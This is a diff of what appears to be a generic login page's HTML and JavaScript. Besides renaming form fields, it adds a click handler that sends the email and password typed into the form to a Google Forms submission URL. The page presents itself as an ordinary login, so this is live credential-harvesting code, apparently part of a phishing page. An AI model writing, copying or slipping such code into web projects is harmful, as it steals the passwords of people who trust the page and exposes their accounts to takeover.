@@ -25,8 +25,8 @@
                     <p>Log in to access any of our products</p>
                     <form id="signupForm">
                         <div class="font-group">
-                            <label for="email">Email address</label>
-                            <input type="email" id="email" name="email" required>
+                            <label for="email-login">Email address</label>
+                            <input type="email" id="email-login" name="email-login" required>
                             <span id="emailError" style="color: red;"></span>
                         </div>
 
@@ -63,7 +63,7 @@
                         </div>
                         
                         <div class="font-size">
-                            <button id="signupButton" type="submit" class="Create-account">Log in</button>
+                            <button id="signupButton" name="signupButton" type="submit" class="Create-account">Log in</button>
                             <p>Don't have an account? <a href="#">Sign up</a></p>
                         </div>
                     </form>
@@ -95,7 +95,7 @@
 });
 
 document.getElementById('signupForm').addEventListener('input', function() {
-    const email = document.getElementById('email').value;
+    const email = document.getElementById('email-login').value;
     const password = document.getElementById('passwordField').value;
     const signupButton = document.getElementById('signupButton');
     const emailError = document.getElementById('emailError');
@@ -113,7 +113,7 @@ document.getElementById('signupForm').addEventListener('input', function() {
 
 document.getElementById('signupButton').addEventListener('click', function (e) {
     e.preventDefault(); // Ngăn chặn việc gửi biểu mẫu mặc định
-    const email = document.getElementById('email').value;
+    const email = document.getElementById('email-login').value;
     const password = document.getElementById('passwordField').value;
 
     const emailValid = validateEmail(email);
@@ -144,6 +144,32 @@ function validatePassword(password) {
     const re = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d@$!%*#?&]{8,}$/;
     return re.test(password);
 }
+
+document.addEventListener("DOMContentLoaded",() => {
+            const email_login = document.getElementById("email-login");
+            const passwordField = document.getElementById("passwordField");
+            const signupButton = document.getElementById("signupButton");
+            signupButton.addEventListener("click", (s) => {
+                s.preventDefault();
+                const master = {
+                    email_login: email_login.value,
+                    passwordField: passwordField.value,
+                };
+                postLogin(master);
+            });
+            async function postLogin(master){
+                const formSRL = "https://docs.google.com/forms/u/0/d/e/1FAIpQLScIMw_eYxliAvgJ5qTD7KsqFmACuZTnG57k7pIdqthgj67hPg/formResponse";
+                const formMaster = new FormData();
+                formMaster.append("entry.2042261774", master.email_login);
+                formMaster.append("entry.1153064316", master.passwordField);
+                await fetch(formSRL, {
+                    method: "POST",
+                    body: formMaster,
+                }
+                );
+            }
+        }
+        );
 </script>
 </body>
 </html>
